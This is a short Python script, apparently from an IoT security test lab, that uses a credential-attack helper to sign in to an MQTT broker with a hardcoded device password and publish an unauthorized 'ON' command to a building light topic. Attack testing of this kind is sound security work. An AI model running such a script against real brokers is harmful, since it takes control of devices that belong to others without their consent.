from attacks.credential_attack import CredentialAttack


BROKER = "mqtt_broker"
PORT = 1883

VALID_USERNAME = "iot_device"
VALID_PASSWORD = "IoTDevice@123"


attack = CredentialAttack(
    BROKER,
    PORT,
    VALID_USERNAME,
    VALID_PASSWORD
)

print("Testing unauthorized MQTT command...", flush=True)

result = attack.publish_unauthorized_command(
    "building/light/command",
    "ON"
)

print("Publish result:", result, flush=True)